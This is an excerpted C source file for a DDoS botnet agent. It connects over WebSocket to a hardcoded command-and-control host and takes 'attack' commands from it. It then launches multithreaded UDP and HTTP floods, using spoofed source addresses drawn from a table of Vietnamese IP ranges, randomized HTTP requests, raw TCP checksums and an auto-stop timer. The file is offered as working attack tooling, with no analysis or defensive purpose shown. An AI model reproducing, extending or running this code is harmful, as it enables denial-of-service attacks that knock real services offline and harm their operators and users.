...
static const vn_ip_t VN_POOL[] = {
    {0x0ea00000, 0xffe00000},
    {0x0ee00000, 0xffe00000},
    {0x1b400000, 0xfff00000},
    {0x2a700000, 0xfff00000},
    {0x71a00000, 0xffe00000},
    {0x71b90000, 0xffff0000},
    {0x73480000, 0xfff80000},
    {0x74600000, 0xfff00000},
    {0x75000000, 0xfff00000},
    {0x76440000, 0xfffc0000},
    {0x7b100000, 0xfff00000},
    {0x7dd48000, 0xffff8000},
    {0xabe00000, 0xffe00000},
    {0xcba20000, 0xffff0000},
    {0x1b480000, 0xfff80000},
    {0x73490000, 0xffff0000},
    {0x734a0000, 0xfffe0000},
    {0x734c0000, 0xfffc0000},
    {0x73540000, 0xfffc0000},
    {0x74680000, 0xfffc0000},
    {0x75010000, 0xffff0000},
    {0x75020000, 0xfffe0000},
    {0x75040000, 0xfffc0000},
    {0xabe80000, 0xfffc0000},
    {0x2a010000, 0xffff0000},
    {0x2a710000, 0xffff0000},
    {0x76450000, 0xffff0000},
    {0x76460000, 0xfffe0000},
    {0xb7500000, 0xffff0000},
    {0xb7510000, 0xffff8000},
    {0x704e0000, 0xffff0000},
    {0x70c50000, 0xffff0000},
    {0x75678000, 0xffff8000},
};
...
static inline uint32_t rand_vn_ip(void)
{
    ...
    if (!seed)
        seed = time(NULL) ^ (unsigned long)pthread_self();
...
static void gen_http(unsigned char *buf, int *len, const char *host)
{
    ...
    char qs[64] = "";
    if (rand_r(&s) % 2)
        snprintf(qs, sizeof(qs), "?v=%u", rand_r(&s) % 1000000000);
    char xff[64] = "";
    if (rand_r(&s) % 4 == 0)
    {
...
static uint16_t tcp_csum(void *ip, void *tcp)
{
    ...
    for (size_t i = 0; i < sizeof(ps) / 2; i++)
        a += p[i];
    p = (uint16_t *)tcp;
...
static int ws_connect(WS *ws, const char *bot_id)
{
    ...
    if (ws->use_ssl)
        SSL_write(ws->ssl, req, strlen(req));
    else
        send(ws->sockfd, req, strlen(req), MSG_NOSIGNAL);
...
static int ws_recv(WS *ws, char *buf, int cap)
{
    ...
    if (masked)
    {
        ws->use_ssl ? SSL_read(ws->ssl, mk, 4) : recv(ws->sockfd, mk, 4, 0);
    }
...
int main(int argc, char *argv[])
{
    ...
    /* Config */
    Config cfg = {0};
    strcpy(cfg.c2_host, argc > 1 ? argv[1] : "bot.minhvuong.io.vn");
    ...
    while (!g_shutdown)
    {
        ...
        while (!g_shutdown)
        {
            ...
            if (n < 0)
            {
                if (time(NULL) - last_hb > cfg.stale_timeout)
                    break;
                usleep(100000);
                continue;
            }
            ...
            else if (!strcmp(type, "attack"))
            {
                ...
                if (!atk.max_pps)
                    atk.max_pps = cfg.default_pps;
                if (!atk.max_threads)
                    atk.max_threads = cfg.default_threads;
                if (!atk.method[0])
                    strcpy(atk.method, "UDP");
...
struct { AttackParams *ap; TokenBucket *tb; struct sockaddr_in ta; int cpu; } *aatk = malloc(sizeof(*aatk));
                        aatk->ap = ap; aatk->tb = tbp; aatk->ta = ta; aatk->cpu = cpu;
                        pthread_create(&tids[i], NULL, attack_worker, aatk);
                    }

                    /* Auto-stop timer */
                    pthread_t timer;
                    struct stop_ctx *sc = malloc(sizeof(struct stop_ctx));
                    sc->dur = atk.duration_secs;
                    sc->running = &atk_running;
                    pthread_create(&timer, NULL, stop_timer, sc);
